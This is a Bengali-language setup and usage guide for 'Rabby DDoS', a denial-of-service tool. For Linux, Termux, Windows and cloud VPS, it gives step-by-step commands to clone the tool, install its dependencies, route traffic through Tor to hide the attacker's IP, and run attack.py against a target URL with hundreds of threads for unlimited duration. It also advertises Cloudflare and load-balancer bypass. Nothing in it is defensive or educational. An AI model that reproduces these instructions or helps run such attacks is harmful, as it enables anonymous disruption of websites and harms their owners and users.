🔥 Rabby DDoS Setup & Usage Guide (Step-by-Step) 🔥

এই গাইডটি Linux, Termux, Windows & VPS-এ Rabby DDoS সেটআপ ও চালানোর সম্পূর্ণ প্রক্রিয়া সহজভাবে ব্যাখ্যা করা হয়েছে।


---

🔰 Linux (Ubuntu, Debian, Kali, Parrot OS, etc.)

📌 Step 1: প্যাকেজ আপডেট করুন

sudo apt update && sudo apt upgrade -y

📌 Step 2: প্রয়োজনীয় প্যাকেজ ইনস্টল করুন

sudo apt install git python3 python3-pip tor -y

📌 Step 3: Rabby DDoS টুল ডাউনলোড করুন

git clone https://github.com/KhHacker001/Rabby_ddos.git

📌 Step 4: ডিরেক্টরিতে প্রবেশ করুন

cd Rabby_ddos

📌 Step 5: প্রয়োজনীয় লাইব্রেরি ইনস্টল করুন

pip3 install -r requirements.txt

📌 Step 6: TOR সার্ভিস চালু করুন

tor &

📌 Step 7: Rabby DDoS চালান

python3 attack.py


---

📌 Termux (Android)

🔹 Step 1: প্যাকেজ আপডেট করুন

pkg update && pkg upgrade -y

🔹 Step 2: প্রয়োজনীয় প্যাকেজ ইনস্টল করুন

pkg install git python python-pip tor -y

🔹 Step 3: Rabby DDoS টুল ডাউনলোড করুন

git clone https://github.com/KhHacker001/Rabby_ddos.git

🔹 Step 4: ডিরেক্টরিতে প্রবেশ করুন

cd Rabby_ddos

🔹 Step 5: প্রয়োজনীয় লাইব্রেরি ইনস্টল করুন

pip install -r requirements.txt

🔹 Step 6: TOR চালু করুন

tor &

🔹 Step 7: Rabby DDoS চালান

python attack.py


---

📌 Windows (CMD বা PowerShell দিয়ে রান করুন)

🔹 Step 1: Python & Git ইনস্টল করুন

👉 Python Download
👉 Git Download

⚠️ ইনস্টল করার সময় Add Python to PATH অপশন টিক দিয়ে ইনস্টল করুন।

🔹 Step 2: Command Prompt (CMD) ওপেন করুন এবং প্যাকেজ আপডেট করুন

pip install --upgrade pip

🔹 Step 3: Rabby DDoS টুল ডাউনলোড করুন

git clone https://github.com/KhHacker001/Rabby_ddos.git

🔹 Step 4: ডিরেক্টরিতে প্রবেশ করুন

cd Rabby_ddos

🔹 Step 5: প্রয়োজনীয় লাইব্রেরি ইনস্টল করুন

pip install -r requirements.txt

🔹 Step 6: TOR চালু করুন

TOR ব্রাউজার ওপেন করুন এবং Settings > Network > SOCKS Proxy 127.0.0.1:9050 সেট করুন।

🔹 Step 7: Rabby DDoS চালান

python attack.py


---

📌 VPS (AWS, Google Cloud, DigitalOcean, etc.)

🔹 Step 1: প্যাকেজ আপডেট করুন

sudo apt update && sudo apt upgrade -y

🔹 Step 2: প্রয়োজনীয় প্যাকেজ ইনস্টল করুন

sudo apt install git python3 python3-pip tor -y

🔹 Step 3: Rabby DDoS টুল ডাউনলোড করুন

git clone https://github.com/KhHacker001/Rabby_ddos.git

🔹 Step 4: ডিরেক্টরিতে প্রবেশ করুন

cd Rabby_ddos

🔹 Step 5: প্রয়োজনীয় লাইব্রেরি ইনস্টল করুন

pip3 install -r requirements.txt

🔹 Step 6: TOR চালু করুন

tor &

🔹 Step 7: Rabby DDoS চালান

python3 attack.py


---

🔥 কিভাবে Rabby DDoS ব্যবহার করবেন?

✅ প্রথমে টুল চালান:

python3 attack.py  (Linux/VPS)  
python attack.py   (Windows/Termux)

✅ তারপর প্রয়োজনীয় ইনপুট দিন:
1️⃣ Target URL দিন: http://example.com
2️⃣ Attack Method সিলেক্ট করুন (GET/POST)
3️⃣ Thread Count দিন (Recommended: 500 - 1000)
4️⃣ Attack Duration দিন (Leave empty for unlimited)

🔥 তারপর আক্রমণ শুরু হবে!


---

🚀 Extra Features & Tips

🔹 Proxy Bypass Enabled ✅
🔹 Cloudflare & Load Balancer Bypass ✅
🔹 TOR Proxy Integration (IP Hide) ✅
🔹 Multi-Threading (High Speed Attack) ✅
🔹 Error Handling (No Crash Issues) ✅
🔹 Windows, Linux, Termux, VPS Compatible ✅


---

🔥 সব কিছু ঠিকঠাক সেটাপ করলে, এখন তুমি সম্পূর্ণ শক্তিশালী "Rabby DDoS" ব্যবহার করতে পারবে! 🚀

আমার সাথে যোগাযোগ করতে ভিজিট করেন http://rabby-hossein.42web.io/

Tor proxy বন্ধের জন্য pkill tor
